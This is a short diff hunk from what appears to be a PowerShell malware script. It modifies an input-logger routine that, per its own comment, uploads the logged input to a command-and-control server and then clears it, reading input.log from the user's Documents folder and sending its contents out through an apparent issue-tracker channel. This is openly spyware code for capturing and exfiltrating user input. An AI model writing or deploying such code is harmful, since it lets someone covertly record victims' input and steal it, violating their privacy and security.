@@ -134,7 +134,10 @@ Write-Host "DEBUG: Input logger starting."
 #Upload the input log to C2, then clear it.
 try 
 {
-	$inputLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\input.log"
+    #Write a M1 click to the input file to make sure it exists and we can write to it without issues.
+    Write-Input -Body "?1" -IssueNumber $issueNumber
+    
+    $inputLogPath = "$env:USERPROFILE\Documents\WindowsPowerShell\input.log"
 	If([System.IO.File]::Exists($inputLogPath))
 	{
 		Send-PackageMessage -Package "INPUT" -IssueNumber $issueNumber -Body (Get-Content -Path $inputLogPath -Raw)
